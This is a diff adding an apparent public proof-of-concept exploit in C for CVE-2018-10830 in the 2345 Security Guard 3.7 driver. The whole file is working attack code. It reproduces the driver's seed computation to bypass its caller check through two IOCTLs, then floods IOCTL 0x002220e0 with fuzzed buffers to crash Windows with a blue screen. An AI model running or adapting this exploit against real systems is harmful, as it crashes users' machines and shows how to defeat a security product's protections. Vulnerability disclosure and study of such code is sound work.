@@ -1,0 +1,332 @@
+# Exploit Title: [BSOD  by IOCTL 0x002220e0 in 2345BdPcSafe.sys  of 2345 Security Guard 3.7]
+# Date: [20180509]
+# Exploit Author: [anhkgg]
+# Vendor Homepage: [http://safe.2345.cc/]
+# Software Link: [http://dl.2345.cc/2345pcsafe/2345pcsafe_v3.7.0.9345.exe]
+# Version: [v3.7] (REQUIRED)
+# Tested on: [Windows X64]
+# CVE : [CVE-2018- 10830]
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+struct NETFW_IOCTL_ADD_PID
+{
+	DWORD pid;
+	char seed[0x14];//4 + 14
+};//0x18
+
+#pragma pack(push)
+#pragma pack(1)
+struct NETFW_IOCTL_SET_PID
+{
+	BYTE set_state;//
+	WORD buf_len;//1
+	DWORD pid;//3
+	char buf[0x64];//7
+};//6B
+#pragma pack(pop)
+
+int __stdcall f_XOR__12A30(BYTE *a1, BYTE *a2)
+{
+	BYTE *a1_; // eax
+
+	a1_ = a1;
+	*a1_ ^= *a2;
+	*a2 ^= *a1;
+	*a1_ ^= *a2;
+	return (int)a1_;
+}
+
+int __stdcall sub_12A80(char *a1, int len, char *a3)
+{
+	int result;
+	unsigned __int8 v4;
+	__int16 i;
+	__int16 j;
+	unsigned __int8 k;
+
+	for (i = 0; i < 256; ++i)
+		a3[i] = i;
+	a3[256] = 0;
+	a3[257] = 0;
+	k = 0;
+	v4 = 0;
+	result = 0;
+	for (j = 0; j < 256; ++j)
+	{
+		v4 += a3[j] + a1[k];
+		f_XOR__12A30((BYTE*)&a3[j], (BYTE*)&a3[v4]);
+		result = (k + 1) / len;
+		k = (k + 1) % len;
+	}
+	return result;
+}
+
+char *__stdcall sub_12B60(char *a1, signed int len, char *a3)
+{
+	char *v3; // esi
+	unsigned int v4; // ebx
+	unsigned __int8 result; // al
+	int v6; // edi
+	char *v7; // ST18_4
+	int v8; // [esp+14h] [ebp-8h]
+	int v9; // [esp+18h] [ebp-4h]
+	unsigned __int8 v10; // [esp+2Fh] [ebp+13h]
+
+	v3 = a3;
+	v4 = a3[256];
+	result = a3[257];
+	v9 = 0;
+	if (len > 0)
+	{
+		v6 = (unsigned __int8)v4;
+		v8 = 0;
+		while (1)
+		{
+			v4 = (v6 + 1) & 0x800000FF;
+			v6 = (unsigned __int8)v4;
+			v10 = v3[(unsigned __int8)v4] + result;
+			v7 = &v3[v10];
+			f_XOR__12A30((BYTE*)&v3[(unsigned __int8)v4], (BYTE*)v7);
+			a1[v8] ^= v3[(unsigned __int8)(v3[(unsigned __int8)v4] + *v7)];
+			v8 = (signed __int16)++v9;
+			if ((signed __int16)v9 >= len)
+				break;
+			result = v10;
+		}
+		result = v10;
+	}
+	v3[256] = v4;
+	v3[257] = result;
+	return (char *)result;
+}
+
+void calc_seed(char* seed, char* dst)
+{
+	char Source1[26] = { 0 };
+	char a3[300] = { 0 };
+
+	Source1[0] = 8;
+	Source1[1] = 14;
+	Source1[2] = 8;
+	Source1[3] = 10;
+	Source1[4] = 2;
+	Source1[5] = 3;
+	Source1[6] = 29;
+	Source1[7] = 23;
+	Source1[8] = 13;
+	Source1[9] = 3;
+	Source1[10] = 15;
+	Source1[11] = 22;
+	Source1[12] = 15;
+	Source1[13] = 7;
+	Source1[14] = 91;
+	Source1[15] = 4;
+	Source1[16] = 18;
+	Source1[17] = 26;
+	Source1[18] = 26;
+	Source1[19] = 3;
+	Source1[20] = 4;
+	Source1[21] = 1;
+	Source1[22] = 15;
+	Source1[23] = 25;
+	Source1[24] = 10;
+	Source1[25] = 13;
+
+	sub_12A80(seed, 0x14, a3);       
+	sub_12B60(Source1, 0x1A, a3);
+	memcpy(dst, Source1, 26);
+}
+
+BOOL BypassChk(HANDLE h)
+{
+	DWORD BytesReturned = 0;
+
+	DWORD ctlcode = 0x222090;
+	NETFW_IOCTL_ADD_PID add_pid = { 0 };
+	add_pid.pid = GetCurrentProcessId();
+
+	if (!DeviceIoControl(h, ctlcode, &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &BytesReturned, NULL)) {
+		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
+		return FALSE;
+	}
+
+	ctlcode = 0x222094;
+	NETFW_IOCTL_SET_PID set_pid = { 0 };
+	set_pid.pid = GetCurrentProcessId();
+	set_pid.set_state = 1;
+
+	calc_seed(add_pid.seed, set_pid.buf);
+	set_pid.buf_len = 26;
+
+	if (!DeviceIoControl(h, ctlcode, &set_pid, sizeof(NETFW_IOCTL_SET_PID), &set_pid, sizeof(NETFW_IOCTL_SET_PID), &BytesReturned, NULL)) {
+		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+HANDLE OpenDevice(char* path)
+{
+	return CreateFileA(path,
+		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+}
+
+CHAR asciiString10[0x10];
+CHAR asciiString100[0x100];
+CHAR asciiString1000[0x1000];
+WCHAR unicodeString10[0x10];
+WCHAR unicodeString100[0x100];
+WCHAR unicodeString1000[0x1000];
+DWORD tableDwords[0x100];
+
+DWORD FuzzConstants[] = {
+	0x00000000, 0x00000001, 0x00000004, 0xFFFFFFFF,
+	0x00001000, 0xFFFF0000, 0xFFFFFFFE, 0xFFFFFFF0,
+	0xFFFFFFFC, 0x70000000, 0x7FFEFFFF, 0x7FFFFFFF,
+	0x80000000,
+	(DWORD)asciiString10,
+	(DWORD)asciiString100,
+	(DWORD)asciiString1000,
+	(DWORD)unicodeString10,
+	(DWORD)unicodeString100,
+	(DWORD)unicodeString1000,
+	(DWORD)tableDwords
+};
+
+/* Period parameters */
+#define N 624
+#define M 397
+#define MATRIX_A 0x9908b0dfUL   /* constant vector a */
+#define UPPER_MASK 0x80000000UL /* most significant w-r bits */
+#define LOWER_MASK 0x7fffffffUL /* least significant r bits */
+
+static unsigned long mt[N]; /* the array for the state vector  */
+static int mti = N + 1; /* mti==N+1 means mt[N] is not initialized */
+
+/* initializes mt[N] with a seed */
+void init_genrand(unsigned long s)
+{
+	mt[0] = s & 0xffffffffUL;
+	for (mti = 1; mti < N; mti++) {
+		mt[mti] =
+			(1812433253UL * (mt[mti - 1] ^ (mt[mti - 1] >> 30)) + mti);
+		/* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */
+		/* In the previous versions, MSBs of the seed affect   */
+		/* only MSBs of the array mt[].                        */
+		/* 2002/01/09 modified by Makoto Matsumoto             */
+		mt[mti] &= 0xffffffffUL;
+		/* for >32 bit machines */
+	}
+}
+
+/* generates a random number on [0,0xffffffff]-interval */
+unsigned long genrand_int32(void)
+{
+	unsigned long y;
+	static unsigned long mag01[2] = { 0x0UL, MATRIX_A };
+	/* mag01[x] = x * MATRIX_A  for x=0,1 */
+
+	if (mti >= N) { /* generate N words at one time */
+		int kk;
+
+		if (mti == N + 1)   /* if init_genrand() has not been called, */
+			init_genrand(5489UL); /* a default initial seed is used */
+
+		for (kk = 0; kk < N - M; kk++) {
+			y = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);
+			mt[kk] = mt[kk + M] ^ (y >> 1) ^ mag01[y & 0x1UL];
+		}
+		for (; kk < N - 1; kk++) {
+			y = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);
+			mt[kk] = mt[kk + (M - N)] ^ (y >> 1) ^ mag01[y & 0x1UL];
+		}
+		y = (mt[N - 1] & UPPER_MASK) | (mt[0] & LOWER_MASK);
+		mt[N - 1] = mt[M - 1] ^ (y >> 1) ^ mag01[y & 0x1UL];
+
+		mti = 0;
+	}
+
+	y = mt[mti++];
+
+	/* Tempering */
+	y ^= (y >> 11);
+	y ^= (y << 7) & 0x9d2c5680UL;
+	y ^= (y << 15) & 0xefc60000UL;
+	y ^= (y >> 18);
+
+	return y;
+}
+
+unsigned long getrand(unsigned long min, unsigned long max)
+{
+	return (genrand_int32() % (max - min + 1)) + min;
+}
+
+//3.7.0.2860
+int poc_2345NetFirewall()
+{
+	
+	DWORD BytesReturned = 0;
+
+	HANDLE h = OpenDevice("\\\\.\\2345BdPcSafe");
+	if (h == INVALID_HANDLE_VALUE) {
+		printf("[-] Open device error: %d\n", GetLastError());
+		return 1;
+	}
+
+	if (!BypassChk(h)) {
+		printf("[-] error!");
+		return 1;
+	}
+
+	DWORD ctlcode = 0x002220e0;
+	BYTE  bufInput[0x10000] = { 0 };
+	BYTE  bufOutput[0x10000] = { 0 };
+
+	srand(time(NULL));
+	int count = 0;
+	while (count++ < 1000) {
+		// Choose a random length for the buffer
+		size_t randomLength = getrand(4, 0x400);
+
+		for (int i = 0; i < randomLength; i = i + 4) {
+			int fuzzData = FuzzConstants[getrand(0, (sizeof(FuzzConstants) / 4) - 1)];
+
+			// Choose a random element into FuzzConstants
+			bufInput[i] = fuzzData & 0x000000ff;
+			bufInput[i + 1] = (fuzzData & 0x0000ff00) >> 8;
+			bufInput[i + 2] = (fuzzData & 0x00ff0000) >> 16;
+			bufInput[i + 3] = (fuzzData & 0xff000000) >> 24;
+		}
+
+		DeviceIoControl(h,
+			ctlcode,
+			bufInput,
+			randomLength,
+			bufOutput,
+			0,
+			&BytesReturned,
+			NULL);
+
+		Sleep(10);
+	}
+
+	return 0;
+}
+
+int main()
+{
+	poc_2345NetFirewall();
+
+	printf("poc failed!\n");
+
+	getchar();
+		
+	return 0;
+}
